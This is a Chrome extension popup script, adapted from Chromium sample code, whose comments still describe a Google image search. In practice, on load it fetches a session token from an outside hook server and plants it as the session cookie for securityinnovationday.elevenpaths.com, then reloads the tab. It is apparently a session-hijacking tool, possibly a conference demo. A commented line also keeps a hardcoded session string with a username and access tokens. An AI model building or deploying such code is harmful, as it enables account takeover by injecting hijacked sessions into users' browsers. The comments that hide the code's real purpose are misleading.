// Copyright (c) 2014 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

function cookieForCreationFromFullCookie(cookieName, cookieValue) {
     var newCookie = {};
     //If no real url is available use: "https://" : "http://" + domain + path
     newCookie.url = "https://securityinnovationday.elevenpaths.com/";
     newCookie.name = cookieName;
     newCookie.value = cookieValue;
     //if(!fullCookie.hostOnly)
     newCookie.domain = "securityinnovationday.elevenpaths.com";
     newCookie.path = "/";
     //newCookie.secure = false;
     //newCookie.httpOnly = false;
     //if(!fullCookie.session)
     //newCookie.expirationDate = fullCookie.expirationDate;
     //newCookie.storeId = "0";
     return newCookie;
}

function getCurrentTabUrl(callback) {
  // Query filter to be passed to chrome.tabs.query - see
  // https://developer.chrome.com/extensions/tabs#method-query
  var queryInfo = {
    active: true,
    currentWindow: true
  };

  chrome.tabs.query(queryInfo, function(tabs) {
    // chrome.tabs.query invokes the callback with a list of tabs that match the
    // query. When the popup is opened, there is certainly a window and at least
    // one tab, so we can safely assume that |tabs| is a non-empty array.
    // A window can only have one active tab at a time, so the array consists of
    // exactly one tab.
    var tab = tabs[0];

    // A tab is a plain object that provides information about the tab.
    // See https://developer.chrome.com/extensions/tabs#type-Tab
    var url = tab.url;

    // tab.url is only available if the "activeTab" permission is declared.
    // If you want to see the URL of other tabs (e.g. after removing active:true
    // from |queryInfo|), then the "tabs" permission is required to see their
    // "url" properties.
    console.assert(typeof url == 'string', 'tab.url should be a string');

    callback(url);
  });

  // Most methods of the Chrome extension APIs are asynchronous. This means that
  // you CANNOT do something like this:
  //
  // var url;
  // chrome.tabs.query(queryInfo, function(tabs) {
  //   url = tabs[0].url;
  // });
  // alert(url); // Shows "undefined", because chrome.tabs.query is async.
}

function parseCookieArray(cookieArray){
  cookieArray = cookieArray.split(";");
  var cookie = [];
  for (var i = 0; i < cookieArray.length; i++) {
    cookie.push(cookieArray[i].split("="));
  }
  return cookie;
}

function stringToAscii(s)
{
  var ascii="";
  if(s.length>0)
    for(i=0; i<s.length; i++)
    {
      var c = ""+s.charCodeAt(i);
      while(c.length < 3)
       c = "0"+c;
      ascii += c;
    }
  return(ascii);
}

function deleteAll(cookieList, url) {
    for(var i=0; i<cookieList.length; i++) {
        var curr = cookieList[i];
        deleteCookie(url, curr.name, curr.storeId);
    }
    cookieList = new Array();
}


function setCookie(searchTerm, callback, errorCallback) {
  // Google image search - 100 searches per day.
  // https://developers.google.com/image-search/
  var endPoint = 'http://sdklib.org:88/api/1.0/hooks/1/response/';
  var x = new XMLHttpRequest();
  x.open('GET', endPoint);
  x.onload = function() {
    // Parse and process the response from Google Image Search.
    var response = x.response;
    if (!response || !response.responseData || !response.responseData.results || response.responseData.results.length === 0) {
      //alert(x.responseText.split("=")[0] + " - " + x.responseText.split("=")[1]);

      //cookies = parseCookieArray(x.responseText);
      //for (var i = 0; i < cookies.length; i++){
      cookie_value = response.replace("11P-SID-2016_SESSION=","");
      cookie_value = cookie_value.replace("\"","");
      cookie_value = cookie_value.replace("\"","");
      cookie_value = cookie_value.replace("\n","");

      //cookies = cookies.substring(0, cookies.length-1);
      //hardcode_value = "a3cf524764ff25b7a6a8753add1e123dbcfe21b5-sca=1474621762718&username=david.amrani%4011paths.com&___AT=965c78fce7c978f8a19c5fa43ad92a5d54f503f1&sla=1474621762760&lang=en&___TS=1474625362758"
      //if (cookie_value != hardcode_value){
 //	  alert(cookie_value + "OO" +  hardcode_value)
  //    }
      mynewcookie = cookieForCreationFromFullCookie("11P-SID-2016_SESSION", cookie_value);
      //alert (mynewcookie.value)

      chrome.cookies.set(mynewcookie);
      //}
      errorCallback('No response from endpoint');
      return;
    }


    var firstResult = response.responseData.results[0];
    // Take the thumbnail instead of the full image to get an approximately
    // consistent image size.
    var imageUrl = firstResult.tbUrl;
    var width = parseInt(firstResult.tbWidth);
    var height = parseInt(firstResult.tbHeight);
    console.assert(
        typeof imageUrl == 'string' && !isNaN(width) && !isNaN(height),
        'Unexpected respose from  API!');
    callback(imageUrl, width, height);
  };
  x.onerror = function() {
    errorCallback('Network error.');
  };
  x.send();
}

function reloadTab(){
  chrome.tabs.query({
    active: true,               // Select active tabs
    lastFocusedWindow: true     // In the current window
  }, function(array_of_Tabs) {
      // Since there can only be one active tab in one active window,
      //  the array has only one element
      var tab = array_of_Tabs[0];
      chrome.tabs.update(tab.id,{url: tab.url}, function(tab) {
        chrome.tabs.executeScript(tab.id);
      });
      // ... do something with url variable
  });
}

function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

function renderStatus(statusText) {
  document.getElementById('status').textContent = statusText;
}

document.addEventListener('DOMContentLoaded', function() {
  getCurrentTabUrl(function(url) {

    setCookie(url, function(imageUrl, width, height) {
      var imageResult = document.getElementById('image-result');
      // Explicitly set the width/height to minimize the number of reflows. For
      // a single image, this does not matter, but if you're going to embed
      // multiple external images in your page, then the absence of width/height
      // attributes causes the popup to resize multiple times.
      imageResult.width = width;
      imageResult.height = height;
      imageResult.src = imageUrl;
      imageResult.hidden = false;

    }, function(errorMessage) {
      renderStatus('Loading token... ' + errorMessage);
    });
    sleep(2500).then(() => {
        reloadTab();
    });

  });
});
